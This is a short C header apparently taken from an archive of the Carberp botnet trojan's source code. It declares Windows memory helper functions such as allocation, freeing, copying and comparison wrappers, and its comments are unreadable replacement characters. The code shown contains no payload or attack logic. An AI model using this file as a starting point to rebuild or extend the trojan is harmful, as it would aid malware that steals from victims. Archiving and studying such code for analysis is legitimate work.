/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>

void *m_memset(void *szBuffer, DWORD dwSym, DWORD dwLen);
void *m_memcpy(void *szBuf, const void *szStr, int nLen);
int   m_memcmp(const void *buf1, const void *buf2, size_t count);



// ������ ������ ���������� ������
DWORD  GetMemSize( LPVOID lpAddr );

// ���������� ������
VOID   MemFree( LPVOID lpAddr );

// �������� ������ ���������� �������
LPVOID MemAlloc( DWORD dwSize );

// �������� � �������� ������ ���������� �������
LPVOID MemAllocAndClear(DWORD Size);

// ������������ ������
LPVOID MemRealloc( LPVOID lpAddr, DWORD dwSize );

